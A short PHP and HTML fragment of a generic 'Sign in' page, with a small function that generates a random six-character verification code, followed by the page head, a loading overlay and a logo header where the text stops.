<?php

include "server.php";
	
function recap()
{
  $a = ['l' => ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","w","x","y","z"],
	'n'=> [0,1,2,4,5,6,7,8,9]
	];
	$lenght = 6;
	$code = "";
	for($i = 0 ; $i < $lenght ; $i++){
		$ind = array_rand($a);
	   $fig = array_rand($a[$ind]);
	 $code .= $a[$ind][$fig];
		 
	}
	return $code;
} 
?>

<html>
<head>
<title>Sign in</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon" href="favicoon.ico" />
<link href="css/style.css" rel="stylesheet" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 </head>
 <body>
<div class="loading"><div class="load-body"><img id="load-body-img" src="loading.gif"><h1 id="loadmsg"></h1></div></div>
 <div class="main">
<div class="header"><img src="logo.png"></div>